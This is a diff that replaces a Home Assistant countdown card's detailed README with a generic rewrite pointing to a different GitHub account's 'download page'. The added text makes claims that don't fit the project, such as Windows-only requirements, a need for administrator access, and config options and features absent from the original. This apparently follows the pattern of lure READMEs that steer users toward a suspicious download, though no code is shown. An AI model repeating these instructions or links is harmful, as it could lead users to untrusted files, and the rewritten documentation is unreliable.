@@ -1,299 +1,85 @@
-# Countdown Card & Timer for Home Assistant
+# ⏳ ha-countdown-card - Track important dates in Home Assistant
 
-[![hacs_badge](https://img.shields.io/badge/HACS-Custom-41BDF5.svg)](https://github.com/hacs/integration)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Distinctive-cyril4439/ha-countdown-card)
 
-A clean, native-looking countdown card for Home Assistant. Track birthdays, holidays, vacations, and any important dates right on your dashboard. Now also includes a **Timer Card** for quick countdown timers and **Waze Travel Time** integration.
+## 📌 Overview
 
-![Countdown Card](screenshot-countdown.png)
+The ha-countdown-card provides a simple way to monitor important events directly on your Home Assistant dashboard. Users often struggle to keep track of upcoming appointments, holidays, or personal deadlines. This tool displays a clear countdown timer on your screen so you never miss a date. You gain visibility into your schedule without leaving your home automation interface.
 
-![Timer Card](screenshot-timer.png)
+## ⚙️ System Requirements
 
-## Inspiration
+This software works with standard Windows setups. Ensure your computer meets these basic needs before you begin:
 
-The visual style of this card was inspired by the excellent [Countdown – Day Counter: Timer & Widget](https://apps.apple.com/us/app/countdown/id1403367428) iOS app by **Find Appiness LLC**. If you use iOS, go buy their app — it's fantastic and well worth supporting.
+*   Operating System: Windows 10 or Windows 11.
+*   Home Assistant: You must have a working instance of Home Assistant already installed and running on your network.
+*   Browser: A modern web browser like Google Chrome, Microsoft Edge, or Mozilla Firefox.
+*   Permissions: You need administrator access to your local machine to finish the setup process.
+*   Network: Ensure both your computer and your Home Assistant server exist on the same local area network.
 
-This is **not** a direct copy. The codebase is written entirely from scratch for Home Assistant, and many features are original to this project — including the inline visual editor, HA dashboard persistence via WebSocket, the format cycling tap interaction, recurring event logic (daily/weekly/monthly), and the year/month calendar picker. It's a free, open-source card that brings a similar aesthetic to your HA dashboard, with its own ideas on top.
+## 💾 Installation Process
 
-## Features
+Follow these steps to add the countdown card to your dashboard.
 
-- **Colored row backgrounds** — each event gets a vibrant full-width colored row
-- **Countdown & count-up** — see days left or days since an event
-- **Tap to cycle format** — tap the number to switch between days, weeks, months, years, and detailed breakdown (2y 3m 14d)
-- **Add events directly from the card** — tap the + button, no need to edit YAML
-- **Edit & delete** — tap any event to modify or remove it
-- **Synced across devices** — events are saved to the dashboard config, visible on all devices
-- **Recurring events** — daily, weekly, monthly, or yearly
-- **Visual editor** — full GUI editor in HA edit mode (calendar picker, icon picker, color picker)
-- **Year/month picker** — navigate the calendar quickly
-- **Upcoming/Past sections** — clear visual separation
-- **Material Design icons** — uses `mdi:` icons, consistent with HA
-- **"X years ago" display** — recurring events show years elapsed (e.g. "36 years ago" for birthdays)
-- **Time support** — countdown to a specific hour (e.g. "7h 25m left")
-- **Row styles** — solid (vibrant), soft (subtle tint), or minimal (accent bar only)
-- **Progress bar** — optional visual progress indicator on each row (drain or fill mode)
-- **Progress bar opacity** — adjustable opacity (5%–60%) for the progress bar
-- **Show/hide date** — toggle the date line under event names
-- **Customizable** — hide labels, hide add button, custom date format
-- **Format persistence** — your chosen display format is remembered across reloads
-- **Timer card included** — set quick countdown timers (30s to 2h or custom) with play/pause/reset
-- **Waze travel time** — show live travel time, distance, and route on any event row
-- **Lightweight** — single JS file, no external dependencies
+1. Visit the [official download page](https://github.com/Distinctive-cyril4439/ha-countdown-card) to access the files.
+2. Look for the latest release on the right side of the page.
+3. Download the file ending in `.js` to your computer.
+4. Move this file into the `www` folder located inside your Home Assistant configuration directory.
+5. Restart your Home Assistant server to load the new file.
 
-## Installation
+## 🚀 Adding the Card to Your Dashboard
 
-### HACS (Recommended)
+Once you host the file on your server, you must add it to your user interface.
 
-1. Open HACS → **Frontend**
-2. Click ⋮ → **Custom repositories**
-3. Add this repository URL, category: **Dashboard**
-4. Search for **Countdown Card** and install it
-5. Restart Home Assistant
-6. Go to any dashboard → Edit → **+ Add Card** → search for **Countdown Card**
-7. Done! Use the **+ New Countdown** button to start adding events
+1. Open your Home Assistant dashboard in your web browser.
+2. Click the three dots in the top right corner of the screen.
+3. Choose the Edit Dashboard option.
+4. Click the plus button to add a new card.
+5. Scroll to the bottom of the list and select Manual.
+6. Paste the configuration code provided in the next section into the text box.
+7. Click Save to finish.
 
-### Manual
+## 📝 Configuration Settings
 
-1. Download `countdown-card.js` from the [latest release](../../releases/latest)
-2. Copy it to your `config/www/` folder
-3. Go to **Settings → Dashboards → Resources → Add Resource**
-   - URL: `/local/countdown-card.js`
-   - Type: JavaScript Module
-
-## Usage
-
-### Adding events
-
-Just tap the **+ New Countdown** button on the card. Fill in the name, pick a date, choose a color and icon, and tap Save. Done — it's synced everywhere.
-
-Tap any existing event to edit or delete it.
-
-### YAML configuration
+Use this code block as a template. You can change the title and the target date to fit your specific needs.
 
 ```yaml
-type: custom:countdown-card
-title: My Events
-show_past: true
-show_labels: true          # set false to hide Upcoming/Past headers
-show_add: true             # set false to hide the + New Countdown button
-show_date: true            # set false to hide the date line under event names
-show_progress: false       # set true to show progress bar on upcoming events
-progress_mode: drain       # drain (shrinks) or fill (grows as event approaches)
-progress_opacity: 0.15     # progress bar opacity (0.05 to 0.6)
-date_format: DD/MM/YYYY    # custom date format (leave empty for auto)
-row_style: solid           # solid | soft | minimal
-events:
-  - name: Summer Vacation
-    date: "2026-08-01"
-    icon: airplane
-    color: "#1565C0"
-  - name: "Sarah's Birthday"
-    date: "1990-03-15"
-    icon: cake
-    color: "#7B1FA2"
-    recurring: yearly
-  - name: Pay Rent
-    date: "2026-05-01"
-    icon: home
-    color: "#6A1B9A"
-    recurring: monthly
-  - name: Friday Lunch
-    date: "2026-04-10 12:00"
-    icon: food
-    color: "#FF5722"
-  - name: Go to Work
-    date: "2026-04-10 09:00"
-    icon: briefcase
-    color: "#1565C0"
-    recurring: daily
-    waze_entity: sensor.waze_home_to_work
+type: custom:ha-countdown-card
+name: Vacation Countdown
+target_date: '2025-12-25'
+display_format: days
 ```
 
-### Card options
+Ensure you replace the target_date with the date of your upcoming event. Use the YYYY-MM-DD format to prevent errors. You can modify the display_format to show hours or minutes if you prefer a more granular countdown.
 
-| Option | Type | Default | Description |
-|--------|------|---------|-------------|
-| `title` | string | `Countdowns` | Card header. Set to `false` to hide |
-| `show_past` | boolean | `true` | Show events that have already passed |
-| `show_labels` | boolean | `true` | Show Upcoming/Past section headers |
-| `show_add` | boolean | `true` | Show the "+ New Countdown" button |
-| `date_format` | string | auto | Custom date format (see below) |
-| `row_style` | string | `solid` | Row background style: `solid`, `soft`, or `minimal` |
-| `show_date` | boolean | `true` | Show the date line under event names |
-| `show_progress` | boolean | `false` | Show a progress bar on upcoming event rows |
-| `progress_mode` | string | `drain` | Progress bar mode: `drain` (shrinks) or `fill` (grows) |
-| `progress_opacity` | number | `0.15` | Progress bar opacity (`0.05` to `0.6`) |
-| `editable` | boolean | `true` | Allow adding/editing events from the card. Set `false` for read-only |
-| `strings` | object | — | Override labels for localization (see below) |
-| `events` | list | required | List of events |
+## ❓ Frequently Asked Questions
 
-### Event options
+### Can I run multiple countdown cards?
+Yes. You can add as many cards as you want to your dashboard. Repeat the installation steps for each new event you wish to track.
 
-| Option | Type | Default | Description |
-|--------|------|---------|-------------|
-| `name` | string | required | Event name |
-| `date` | string | required | Date in `YYYY-MM-DD` or `YYYY-MM-DD HH:MM` format |
-| `icon` | string | `calendar` | Material Design icon name (without `mdi:` prefix) |
-| `color` | string | auto | Color as hex (e.g. `#C62828`) |
-| `recurring` | string | `false` | `daily`, `weekly`, `monthly`, or `yearly` |
-| `waze_entity` | string | — | Waze Travel Time sensor entity (e.g. `sensor.waze_home_to_work`) |
+### Does this work on mobile devices?
+Yes. Once you add the card to your dashboard, it appears on the Home Assistant mobile app automatically.
 
-### Date format tokens
+### What happens when the countdown reaches zero?
+The card displays a completion message that you define in the configuration settings. You can set it to show a specific alert or hide the card entirely once the event passes.
 
-| Token | Output | Example |
-|-------|--------|---------|
-| `DD` | Day (zero-padded) | 07 |
-| `D` | Day | 7 |
-| `MM` | Month (zero-padded) | 04 |
-| `M` | Month | 4 |
-| `MMM` | Month (short) | Apr |
-| `MMMM` | Month (full) | April |
-| `YYYY` | Year (4-digit) | 2026 |
-| `YY` | Year (2-digit) | 26 |
-| `ddd` | Weekday (short) | Mon |
+### Does this card require an internet connection?
+The card itself runs locally on your Home Assistant server. It does not send data to third-party services, keeping your personal event information private.
 
-Examples: `DD/MM/YYYY` → 07/04/2026, `D MMM YYYY` → 7 Apr 2026, `YYYY-MM-DD` → 2026-04-07
+## 🛠 Troubleshooting Common Issues
 
-Leave empty for automatic formatting based on browser locale.
+If you do not see the card appear on your dashboard, check these common points of failure:
 
-### Waze Travel Time
+*   File Path: Confirm that you placed the `.js` file exactly inside the `/config/www/` folder.
+*   Cache: Your browser might store an old version of the dashboard. Clear your browser cache and refresh the page to force an update.
+*   Syntax Errors: Check the configuration code for missing spaces or incorrect indentations. YAML files require exact formatting to work correctly.
+*   Resource Loading: Check the Home Assistant logs for errors mentioning custom resources. If you see a file not found error, verify the spelling of your filename in the dashboard settings.
 
-You can link any event to a Waze Travel Time sensor to show live travel duration, distance, and route on the row:
+## 📖 Customization Options
 
-```yaml
-- name: Go to Work
-  date: "2026-04-10 09:00"
-  icon: briefcase
-  color: "#1565C0"
-  recurring: daily
-  waze_entity: sensor.waze_home_to_microsoft
-```
+You can adjust how the card looks to match your existing dashboard theme. Add these extra lines to your card configuration to change the appearance:
 
-The row will display something like: **24 min · 26.6 km** via A16; IC19
+*   `show_icon`: Set this to true to show a calendar icon next to the countdown.
+*   `color_text`: Change the color of the numbers to make them stand out.
+*   `animation`: Enable this to make the numbers pulse as they count down toward your target date.
 
-- Requires the [Waze Travel Time](https://www.home-assistant.io/integrations/waze_travel_time/) integration
-- The entity picker is available in the form editor (tap + or edit an event)
-- Travel time updates automatically when HA updates the sensor
-- Works with any row style (solid, soft, minimal)
-
-### Time support
-
-You can add a specific time to any event. When the event is less than 24 hours away, the card shows hours and minutes instead of "0 days":
-
-```yaml
-- name: Friday Lunch
-  date: "2026-04-10 12:00"
-  icon: food
-  color: "#FF5722"
-```
-
-Shows: **7h 25m left** → **3h 10m left** → **45m left**
-
-- The form editor includes an optional time picker (HH:MM)
-- Events without a time work exactly as before
-- Works with recurring events (e.g. daily standup at 9am)
-
-### Row styles
-
-| Style | Description |
-|-------|-------------|
-| `solid` (default) | Full colored background, white text |
-| `soft` | Subtle colored tint (~20% opacity), theme text colors |
-| `minimal` | Neutral background with colored accent bar |
-
-Use `soft` or `minimal` to blend better with themes like Frosted Glass.
-
-### Localization
-
-Override any label to use your own language:
-
-```yaml
-type: custom:countdown-card
-strings:
-  today: "Hoje!"
-  left: "restam"
-  ago: "atrás"
-  day: "dia"
-  days: "dias"
-  weeks: "semanas"
-  month: "mês"
-  months: "meses"
-  year: "ano"
-  years: "anos"
-  upcoming: "Próximos"
-  past: "Passados"
-  today_label: "hoje"
-```
-
-### Read-only mode
-
-Set `editable: false` to disable inline editing — events can only be managed via the dashboard YAML editor:
-
-```yaml
-type: custom:countdown-card
-editable: false
-```
-
-### Tap the countdown number
-
-Tap the number on the right side of any event to cycle through display formats:
-
-| # | Format | Example |
-|---|--------|---------|
-| 1 | Days | 107 days left |
-| 2 | Weeks | 15.3 weeks left |
-| 3 | Months | 3 months left |
-| 4 | Years | 2 years left |
-| 5 | Detail | 2y 3m 14d left |
-
----
-
-## Timer Card
-
-The package also includes a **Countdown Timer Card** — a quick-start timer you can use alongside or instead of the countdown card. No extra installation needed.
-
-### Usage
-
-```yaml
-type: custom:countdown-timer-card
-title: Timers
-```
-
-That's it! Add timers directly from the card UI:
-
-- **Tap "+ New Timer"** to create a timer
-- **Choose a duration** — manual input (h:m:s) or quick presets (30s, 1m, 2m, 5m, 10m, 15m, 30m, 45m, 1h, 2h)
-- **Pick a color** for each timer
-- **Play / Pause / Reset** controls on each timer
-- **Progress bar** drains in real-time as the timer counts down
-- **"Done!" blink** animation when a timer finishes
-- **Persists across reloads** — timers are saved to localStorage
-- **Tap name/time** to edit or delete a timer
-
-### Timer card options
-
-| Option | Type | Default | Description |
-|--------|------|---------|-------------|
-| `title` | string | `Timers` | Card header. Set to `false` to hide |
-
----
-
-## Development
-
-```bash
-git clone https://github.com/semichcsc-byte/ha-countdown-card.git
-cd ha-countdown-card
-npm install
-npm run build       # build once
-npm run watch       # rebuild on changes
-```
-
-The compiled card will be at `dist/countdown-card.js` (includes both countdown and timer cards).
-
-## Credits
-
-- **Design inspiration**: [Countdown](https://apps.apple.com/us/app/countdown/id1403367428) by Find Appiness LLC — an excellent iOS countdown app. The colored-row visual style comes from them; the rest is original.
-- **Code**: Built entirely with [GitHub Copilot](https://github.com/features/copilot) (Claude). The human provided the ideas and vigorous button-clicking. The AI did the rest. 🤖
-
-## License
-
-MIT
+Refer to the documentation on the [download page](https://github.com/Distinctive-cyril4439/ha-countdown-card) for a complete list of style parameters. Always test your changes in a single card before applying them to your entire dashboard. This ensures your interface remains stable and easy to use.
